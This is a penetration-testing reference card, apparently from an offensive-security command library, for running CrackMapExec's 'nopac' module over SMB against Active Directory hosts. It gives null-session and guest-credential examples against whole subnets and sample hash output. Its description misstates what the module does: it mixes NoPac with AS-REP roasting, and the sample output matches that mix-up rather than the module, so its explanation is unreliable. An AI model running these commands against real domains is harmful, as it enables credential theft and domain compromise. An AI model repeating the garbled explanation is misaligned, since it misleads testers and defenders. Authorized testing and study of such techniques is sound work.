---
id: 4caf5c41-107d-43ae-a229-fd86e5af0549
name: crackmapexec-smb-nopac
type: command
executor: bash
data: crackmapexec smb $_TARGET_IP -u $_USERNAME -p $_PASSWORD -d $_DOMAIN -M nopac
output: null
created_at: '2023-04-06T03:56:30.721686+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Linux
tags:
  - credential-access
  - active-directory
verified: true
validated: true
---

# crackmapexec-smb-nopac

## Command

```bash
crackmapexec smb $_TARGET_IP -u $_USERNAME -p $_PASSWORD -d $_DOMAIN -M nopac
```

## Description

This command uses CrackMapExec (CME) to enumerate SMB shares and perform a NoPac attack over SMB, requesting Kerberos AS-REP responses from accounts without pre-authentication enabled. It is used in Active Directory penetration testing to identify roastable accounts and extract crackable hashes for credential access, supporting techniques like AS-REP roasting and subsequent account spoofing.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_TARGET_IP | IP address or range of the target host(s) (e.g., 10.10.10.10 or 10.10.10.0/24) | Yes |
| -u $_USERNAME | Username for authentication (use '' for null session) | Yes |
| -p $_PASSWORD | Password for authentication (use '' for null) | Yes |
| -d $_DOMAIN | Domain name to authenticate against (e.g., contoso.com) | Yes |
| -M nopac | Invokes the NoPac module for AS-REP roasting over SMB | Yes |

## Examples

### Basic Usage

```bash
crackmapexec smb 10.10.10.10 -u '' -p '' -d contoso -M nopac
```

### Advanced Usage

```bash
crackmapexec smb 10.10.10.0/24 -u guest -p '' -d contoso -M nopac --output-file asreps.txt
```

## Expected Output

Successful execution might produce:

```
SMB         10.10.10.10    445    DC01             [+] contoso\guest:*
SMB         10.10.10.10    445    DC01             [+] ASREPRoastable::contoso\user1:$krb5asrep$23$username@DOMAIN:hash_here
```

This indicates vulnerable accounts and their AS-REP hashes. Failure shows '[-] No valid credentials' or connection errors.

## Related

- [[procedures/SMB-Credential-Enumeration-for-SAMAccountName-Spoofing]]
- [[tools/CrackMapExec]]
